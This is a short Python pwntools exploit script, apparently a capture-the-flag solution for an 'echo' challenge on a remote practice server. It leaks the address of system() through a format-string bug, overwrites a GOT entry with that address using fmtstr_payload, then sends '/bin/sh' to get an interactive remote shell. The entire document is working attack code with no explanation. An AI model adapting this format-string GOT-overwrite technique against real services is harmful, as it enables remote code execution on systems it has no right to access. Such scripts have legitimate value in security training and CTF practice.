from pwn import *

#io=process("./echo")
io=remote("hackme.inndy.tw",7711)
sys_got=0x804A018

payload1=p32(sys_got)+'%7$s'
io.sendline(payload1)
a=io.recv(8)
print a
print "----------------"
sys_addr=u32(a[4:8])
print sys_addr
payload2=fmtstr_payload(7,{0x0804A010:sys_addr})
io.sendline(payload2)
io.recvline()
io.sendline("/bin/sh\x00")
io.interactive()